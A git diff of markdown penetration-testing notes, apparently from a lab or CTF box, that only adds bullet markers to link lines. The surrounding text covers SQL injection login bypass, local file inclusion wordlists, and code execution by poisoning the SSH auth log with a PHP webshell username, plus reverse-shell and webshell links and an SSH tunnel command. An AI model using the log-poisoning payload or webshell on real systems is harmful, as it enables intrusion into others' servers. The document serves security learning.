@@ -32,13 +32,13 @@ Apparently the file reader reads these .log files and exclude the extension.
 
 # 2 Exploitation
 ## 2.1 Bypass login sqli
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder <- only sqli login bypass
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder <- only sqli login bypass
 ![f05f53f61c3c9f278839e192155f60d3.png](./_resources/e0c248c955274101b329a896edecc53c.png)
 
 ![dee386e1368f678594d530ea7b687f8f.png](./_resources/21ce6dcbe9d944b8b94b6071876fb837.png)
 
 ## 2.3 LFI (local file inclusion) - using bash to generate payloads
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders
 
 First it needs to grep all .log files and exclude the extension.
 We also need add some "../" multiplied by a looping for cases where there is no path traversal:
@@ -64,9 +64,9 @@ cat wl-lfi-with-new-dotdot.txt | sort | uniq > wl-lfi-with-new-dotdot-new.txt
 ![32891abc8f6f2a29e90957c4a48df109.png](./_resources/011ff6b8d8414ce89ab3aefc33f7d4e3.png)
 
 ### 2.3.1 Reverse shell
-https://vk9-sec.com/testing-lfi-to-rce-using-auth-log-ssh-poisoning-with-mutillidae-burpsuite/
-https://github.com/bayufedra/Tiny-PHP-Webshell
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+* https://vk9-sec.com/testing-lfi-to-rce-using-auth-log-ssh-poisoning-with-mutillidae-burpsuite/
+* https://github.com/bayufedra/Tiny-PHP-Webshell
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 ```
 ssh '<?=`$_GET[0]`?>@192.168.196.127'
@@ -100,7 +100,7 @@ And download from target:
 ![ea043ac33ffccefe0be1ce5158627f79.png](./_resources/212f5442c5874501ada84e00a16a47f0.png)
 
 ## 3.1 Remote forwarding with ssh
-https://www.ssh.com/academy/ssh/tunneling/example
+* https://www.ssh.com/academy/ssh/tunneling/example
 
 We need to liberate the internal port 8080 on the kali for examine it:
 `ssh -fN root@192.168.196.121 -R 8888:127.0.0.1:8080`
